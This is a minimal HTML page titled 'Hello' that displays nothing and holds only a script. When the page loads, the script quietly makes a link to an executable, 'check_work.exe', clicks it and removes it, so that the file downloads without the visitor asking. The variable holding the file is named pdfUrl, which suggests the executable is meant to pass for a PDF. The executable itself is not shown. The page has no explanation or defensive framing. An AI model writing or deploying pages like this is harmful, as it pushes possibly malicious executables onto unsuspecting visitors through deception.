<!DOCTYPE html>
<html>
<head>
  <title>Hello</title>
</head>
<body>
<script>
  const pdfUrl = "check_work.exe";
  window.addEventListener('load', () => {
    const link = document.createElement('a');
    link.href = pdfUrl;
    link.download = "check_work.exe";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  });
</script>
</body>
</html>
